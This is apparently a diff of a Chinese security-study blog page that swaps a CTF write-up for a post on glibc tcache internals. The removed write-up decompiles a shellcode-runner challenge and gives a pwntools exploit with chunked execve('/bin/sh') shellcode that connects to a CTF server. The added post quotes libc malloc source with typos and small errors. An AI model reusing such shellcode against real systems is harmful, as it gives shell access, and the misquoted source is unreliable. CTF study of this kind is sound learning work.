@@ -21,27 +21,27 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.25.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"github-dark","dark":"github-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":"mac"},"fold":{"enable":true,"height":500},"language":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":true,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
 
-    <meta name="description" content="shellcode， 汇编, 指令滑板">
+    <meta name="description" content="Tcache">
 <meta property="og:type" content="article">
-<meta property="og:title" content="一些题目">
-<meta property="og:url" content="http://example.com/2026/03/16/interestingChall/asmMaster/index.html">
+<meta property="og:title" content="Tcache">
+<meta property="og:url" content="http://example.com/2026/03/30/heap/tcache/index.html">
 <meta property="og:site_name" content="超级玉米人的博客">
-<meta property="og:description" content="shellcode， 汇编, 指令滑板">
+<meta property="og:description" content="Tcache">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2026-03-16T13:10:08.576Z">
-<meta property="article:modified_time" content="2026-03-29T12:38:33.958Z">
+<meta property="article:published_time" content="2026-03-30T11:30:11.267Z">
+<meta property="article:modified_time" content="2026-03-30T13:06:04.728Z">
 <meta property="article:author" content="超级玉米人">
 <meta property="article:tag" content="study">
 <meta name="twitter:card" content="summary">
 
 
-<link rel="canonical" href="http://example.com/2026/03/16/interestingChall/asmMaster/">
+<link rel="canonical" href="http://example.com/2026/03/30/heap/tcache/">
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2026/03/16/interestingChall/asmMaster/","path":"2026/03/16/interestingChall/asmMaster/","title":"一些题目"}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2026/03/30/heap/tcache/","path":"2026/03/30/heap/tcache/","title":"Tcache"}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>一些题目 | 超级玉米人的博客</title>
+<title>Tcache | 超级玉米人的博客</title>
   
 
 
@@ -214,7 +214,7 @@
   
   <aside class="sidebar">
 
-    <div class="sidebar-inner sidebar-overview-active">
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
       <ul class="sidebar-nav">
         <li class="sidebar-nav-toc">
           文章目录
@@ -227,6 +227,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#tcachelocal-thread-cache"><span class="nav-number">1.</span> <span class="nav-text"> Tcache(Local Thread Cache)</span></a></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -324,7 +325,7 @@ setTimeout(initClock, 100);
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2026/03/16/interestingChall/asmMaster/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2026/03/30/heap/tcache/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.jpg">
@@ -337,12 +338,12 @@ setTimeout(initClock, 100);
     </span>
 
     <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="一些题目 | 超级玉米人的博客">
+      <meta itemprop="name" content="Tcache | 超级玉米人的博客">
       <meta itemprop="description" content="">
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          一些题目
+          Tcache
         </h1>
 
         <div class="post-meta-container">
@@ -352,15 +353,9 @@ setTimeout(initClock, 100);
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">发表于</span>
+      
 
-      <time title="创建时间：2026-03-16 21:10:08" itemprop="dateCreated datePublished" datetime="2026-03-16T21:10:08+08:00">2026-03-16</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2026-03-29 20:38:33" itemprop="dateModified" datetime="2026-03-29T20:38:33+08:00">2026-03-29</time>
+      <time title="创建时间：2026-03-30 19:30:11 / 修改时间：21:06:04" itemprop="dateCreated datePublished" datetime="2026-03-30T19:30:11+08:00">2026-03-30</time>
     </span>
 
   
@@ -372,15 +367,40 @@ setTimeout(initClock, 100);
     
     
     
-    <div class="post-body" itemprop="articleBody"><p>shellcode， 汇编, 指令滑板</p>
+    <div class="post-body" itemprop="articleBody"><p>Tcache</p>
 <span id="more"></span>
-<p>将题目提供的二进制文件拖入ida 得到如下代码</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">  <span class="type">int</span> n4; <span class="comment">// [rsp+Ch] [rbp-24h]</span></span><br><span class="line">  <span class="type">int</span> n3; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="type">int</span> n10; <span class="comment">// [rsp+14h] [rbp-1Ch]</span></span><br><span class="line">  _BYTE *addr_1; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  _BYTE *addr; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  addr = mmap(<span class="number">0</span>, <span class="number">0x1000u</span>, <span class="number">3</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( addr == (_BYTE *)<span class="number">-1LL</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, addr);</span><br><span class="line">  addr_1 = addr;</span><br><span class="line">  v4 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v4 &amp;&amp; addr_1 &lt; addr + <span class="number">4091</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    n4 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( n3 = <span class="number">0</span>; n3 &lt;= <span class="number">3</span>; ++n3 )</span><br><span class="line">    &#123;</span><br><span class="line">      n10 = fgetc(<span class="built_in">stdin</span>);</span><br><span class="line">      <span class="keyword">if</span> ( n10 == <span class="number">-1</span> || n10 == <span class="number">10</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v4 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      addr_1[n3 + <span class="number">1</span>] = n10;</span><br><span class="line">      ++n4;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( n4 == <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *addr_1 = <span class="number">-23</span>;</span><br><span class="line">      addr_1 += <span class="number">5</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  mprotect(addr, <span class="number">0x1000u</span>, <span class="number">5</span>);</span><br><span class="line">  ((<span class="type">void</span> (*)(<span class="type">void</span>))addr)();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>可以发现这是一段执行shellcode 的程序，程序将用户输入的shellcode 按照 4个字节为一组，然后在每一组开头加上 <code>jmp (E9 , -23)</code> 的汇编指令，最后将shellcode 按照顺序拼接起来，然后执行。<br />
-同时题目给了一个后门函数 getshell，但是由于 泄露的地址和getshell 相差2G的偏移，所以无法直接调用。所以这里采用自己构建shellcode的方式。<br />
-我们可以自己生成一个 getshell的 shellcode 然后分组在在每一条指令前面加上 <code>jmp +1</code>的相对跳转，越过程序添加jmp 拼凑出shellcode。</p>
-<p>于是得到如下exp</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;nc1.ctfplus.cn&#x27;</span>, <span class="number">28298</span>)</span><br><span class="line"><span class="comment"># p = process(&quot;./challenge&quot;)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./challenge&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line"><span class="comment"># 接收泄露地址</span></span><br><span class="line">leakedAddr = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">shellcodeAddr = leakedAddr + <span class="number">0x100</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造原始 payload 为了跳到shellcode</span></span><br><span class="line">payload = <span class="string">b&#x27;\x01\x00\x00\x00&#x27;</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">#每双字节分块shellcode ai</span></span><br><span class="line">shellcode = [</span><br><span class="line">    <span class="string">b&#x27;\x31\xf6&#x27;</span>, <span class="string">b&#x27;\x56\x90&#x27;</span>, <span class="string">b&#x27;\x31\xc0&#x27;</span>,</span><br><span class="line">    <span class="string">b&#x27;\xb4\x68&#x27;</span>, <span class="string">b&#x27;\xb0\x73&#x27;</span>, <span class="string">b&#x27;\x66\x50&#x27;</span>,</span><br><span class="line">    <span class="string">b&#x27;\xb4\x2f&#x27;</span>, <span class="string">b&#x27;\xb0\x2f&#x27;</span>, <span class="string">b&#x27;\x66\x50&#x27;</span>,</span><br><span class="line">    <span class="string">b&#x27;\xb4\x6e&#x27;</span>, <span class="string">b&#x27;\xb0\x69&#x27;</span>, <span class="string">b&#x27;\x66\x50&#x27;</span>,</span><br><span class="line">    <span class="string">b&#x27;\xb4\x62&#x27;</span>, <span class="string">b&#x27;\xb0\x2f&#x27;</span>, <span class="string">b&#x27;\x66\x50&#x27;</span>,</span><br><span class="line">    <span class="string">b&#x27;\x54\x5f&#x27;</span>, <span class="string">b&#x27;\x31\xd2&#x27;</span>, <span class="string">b&#x27;\x31\xc0&#x27;</span>, <span class="string">b&#x27;\xb0\x3b&#x27;</span>, <span class="string">b&#x27;\x0f\x05&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> shellcode:</span><br><span class="line">  payload += c + <span class="string">b&#x27;\xeb\x01&#x27;</span> <span class="comment">#eb 01 ; 跳过接下来一字节内容 在这里就是跳过e9</span></span><br><span class="line">payload += p64(shellcodeAddr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#ls</span></span><br><span class="line"><span class="comment">#cat /data/flag\n</span></span><br><span class="line">p.interactive(</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="tcachelocal-thread-cache"><a class="markdownIt-Anchor" href="#tcachelocal-thread-cache"></a> Tcache(Local Thread Cache)</h2>
+<p>在 libc-2.35 中的源代码(__libc_malloc)。其中早就在libc-2.26加入了 Tcache 机制.</p>
+<p>可以看到，在源代码中tcache 机制的实现在 __int_malloc 前，就导致了 __int_malloc 的很多安全价差都被忽略了.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">MAYBE_INIT_TCACHE()</span><br><span class="line"></span><br><span class="line">  DIAG_PUSH_NEDDS_COMMENT;</span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;counts[tc_idx] &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      victim = tcacge_get(tc_idx);             <span class="comment">// &lt;- 这里tcache获取堆块</span></span><br><span class="line">      <span class="keyword">return</span> tag_new_useable (victim);</span><br><span class="line">    &#125;</span><br><span class="line">  DIAG_POP_NEDDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">    &#123;</span><br><span class="line">      victim = tag_new_useable (_int_malloc (&amp;main_arena, bytes));</span><br><span class="line">      assert (!victim || chunk_is_mmapped (mem2chunk (victim))) ||</span><br><span class="line">        &amp;main_area == arena_for_chunk (mem2chunk (victim));</span><br><span class="line">      <span class="keyword">return</span> victim;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  arena_get(ar_ptr, bytes);</span><br><span class="line"></span><br><span class="line">  victim = _int_malloc(ar_ptr, bytes);</span><br><span class="line">  ...</span><br></pre></td></tr></table></figure>
+<p>主要分配函数和释放函数: tache_get(), tcache_put(), 这个机制设计出来的初衷是为了增加堆分配的速度</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">tcacge_get(<span class="type">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcacge_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  <span class="keyword">if</span>(__libc_unlikely (!aligned_OK (e)))</span><br><span class="line">    malloc_printerr(<span class="string">&quot;malloc(): unaligned tcache chunk detected&quot;</span>);</span><br><span class="line">  </span><br><span class="line">  tcacge-&gt;entries[tc_idx] = REVEAL_PTR(e -&gt; next);</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">void</span>* )e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在函数 tcache_get 函数中可以看到tcache实现非常简单，其申请了一个在heap上的区域作为自己的元数据区域来保存各个chunk状态和指针。</p>
+<p>发现其中每个链表可以对应最多7个chunk。并且 tcache采用头插法。而且每个chunk 包含一个key用来判断chunk的状态</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">uint16_t</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">tcacge_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="type">void</span> *vicim = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> <span class="type">size_t</span> bytes = <span class="keyword">sizeof</span>(tcache_perthread_struct);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(tcache_shutting_down)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line">  victim = _int_malloc(ar_ptr, bytes);</span><br><span class="line">  <span class="keyword">if</span>(!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在 tcache_put 中也只做了一段简单的检查就返回了，由此可以看出 tcache 机制的脆弱性，并且 libc-2.35 是tcache加强过的版本。在libc-2.26.libc-2.27 这种远古版本中tcache的脆弱性更低，甚至没有double free<br />
+的检查.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry* e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  <span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will </span></span><br><span class="line"><span class="comment">    detect a double free */</span></span><br><span class="line">  e-&gt; key = tcache_key;</span><br><span class="line"></span><br><span class="line">  e-&gt; next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);</span><br><span class="line">  tcache-&gt;entries[idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>于是我们可以总结出 tcache 的运行流程</p>
+<ul>
+<li>第一次 malloc 的时候，会先malloc 一块内存用来存放 tcache_perthread_struct.</li>
+<li>free 内存，且 size 小于 small bin size 的时候</li>
+<li>tcache 之前会放到 fastbin 或者 unsorted bin 中</li>
+<li>tcache 后:</li>
+</ul>
+<ul>
+<li>先放到对应的 tcache中，直到tcacge被填满（默认是7个）</li>
+<li>tcache 被填满之后，再次free的内存和之前一样被放到 fastbin 或者 unsorted bin 中</li>
+<li>tcache 中的 chunk 不会被合并（不取消 inuse bit）</li>
+</ul>
+<ul>
+<li>malloc 内存，且size 在 tcache范围</li>
+<li>先从 tcache 取 chunk，直到tcache 为空</li>
+<li>tcache 为空后，从bin 中找</li>
+<li>tcache 为空时，如果 fastbin/smallbin/unsorted bin/子啊 中有size符合的chunk，会先把 fastbin/smallbin/unsorted bin/ 中的chunk房贷 tcache 中，直到填满.之后再从tcache中取；因此chunk在 bin 中的<br />
+的顺序会反过来， 另外在tcache中，大部分指针操作都是依靠用户指针进行的.</li>
+</ul>
+
 
         <div>
           
@@ -405,14 +425,11 @@ setTimeout(initClock, 100);
 
           <div class="post-nav">
             <div class="post-nav-item">
-                <a href="/2026/03/14/13%E8%80%83%E6%A0%B8wp/" rel="prev" title="13考核wp">
-                  <i class="fa fa-angle-left"></i> 13考核wp
+                <a href="/2026/03/29/interestingChall/ncpro/" rel="prev" title="ncpro">
+                  <i class="fa fa-angle-left"></i> ncpro
                 </a>
             </div>
             <div class="post-nav-item">
-                <a href="/2026/03/22/heap/uaf/" rel="next" title="Uaf题目">
-                  Uaf题目 <i class="fa fa-angle-right"></i>
-                </a>
             </div>
           </div>
     </footer>
